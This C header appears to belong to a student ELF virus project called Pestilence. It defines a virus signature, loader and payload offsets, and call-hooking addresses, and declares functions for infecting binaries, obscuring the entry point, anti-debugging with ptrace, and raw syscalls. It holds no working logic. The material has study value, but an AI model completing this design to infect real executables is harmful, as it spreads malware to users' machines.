#ifndef PESTILENCE_H
# define PESTILENCE_H

# define _GNU_SOURCE 1
# include <elf.h>
# include <unistd.h>
# include <sys/mman.h>
# include <stdlib.h>
# include <stdio.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <limits.h>

// # define KEY 0x12345678
# define SUB 0x95837523
# define MAGIC_VIRUS 0x4E505241
# define SIGN_SIZE 0x25

# define FT_MEMCPY_ADDR 0x13e0
# define BUF_SIZE 0x20
# define BIS_SIZE 0x1d8
# define LOADER_SIZE 0xca
# define PAYLOAD_SIZE 0x3be1 - FT_MEMCPY_ADDR + 0x7
# define MAIN_OFFSET 0x3a6c - FT_MEMCPY_ADDR
# define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8

# define OFFSET_1 0x27f9 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_2 0x25ea + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_3 0x283b + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_4 0x3a77 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_5 0x161c + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_6 0x3523 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_RIP 0x3532 - FT_MEMCPY_ADDR

# define OFFSET_HOOK_1 0x354d + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_1 0x3543 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_2 0x357a + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_2 0x3570 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_3 0x35a7 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_3 0x359d + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_4 0x35d4 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_4 0x35ca + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_5 0x3601 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_5 0x35f7 + BIS_SIZE - FT_MEMCPY_ADDR

typedef struct		s_info
{
	void		*file;
	int		fd;
	size_t		file_size;
	void		*text_begin;
	size_t		text_size;
	size_t		text_addr;

	void		*addr_call_to_replace;
	void		*addr_hooked_func;

	size_t		bss_size;
	size_t		begin_bss;
	size_t		offset_bis;
	size_t		addr_bis;

	int32_t		 valid_target;
}					t_info;

typedef struct		s_fingerprint
{
	uint32_t	fingerprint;
	uint32_t	index;
}					t_fingerprint;

struct linux_dirent64 {
	ino64_t        d_ino;    /* 64-bit inode number */
	off64_t        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[PATH_MAX]; /* Filename (null-terminated) */
};

void		loader();
int			main();
void		ft_end();
void		syscalls();
// void		woody();

/*			**** FILL_BUFF ****					*/
void		write_begin(char *buf);
void		write_filename_src(char *buf);
void		write_test(char *buf);
void		write_test2(char *buf);
void		write_sign(char *buf);
void		write_proc(char *buf);
void		write_exe(char *buf);
void		write_inhibitor(char *buf);
void		write_stat(char *buf);

/*			**** PARSING ****					*/
int			find_text(t_info *info, t_fingerprint *fingerprint);
void		epo_parsing(t_info *info);
int			pe_parsing(t_info *info);
void		patch_bis(t_info *info, int32_t nb);
int			check_process(char *buf_path);

void		mprotect_text(int prot);

/*			**** LIB HANDLERS	****			*/
void		ft_memcpy(void *dest, void *src, size_t size);
void		ft_memcpy_r(void *dest, void *src, size_t size);
void		ft_memset(void *ptr, size_t size, unsigned char val);
char		*ft_strcat(char *dest, const char *src);
int			ft_sysopen(const char *pathname, int flags);
int			ft_sysopenmode(const char *pathname, int flags, int mode);
int			ft_sysclose(int fd);
ssize_t 	ft_syswrite(int fd, const void *buf, size_t count);
void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int			ft_sysptrace(long request, long pid, unsigned long addr, unsigned long data);
void		*ft_sysmunmap(void *addr, size_t len);
int			ft_sysfstat(int fd, struct stat *buf); 
int			ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
pid_t		ft_sysgetpid();
void		ft_sysreadlink(char *sym_path, char *real_path, size_t size);
int		ft_sysunlink(char *path);
ssize_t		ft_sysread(int fd, void *buf, size_t count);
int			ft_strncmp(const char *s1, const char *s2, int n);
int			ft_strlen(const char *s);
void		*get_rip();
void		double_ret();

#endif
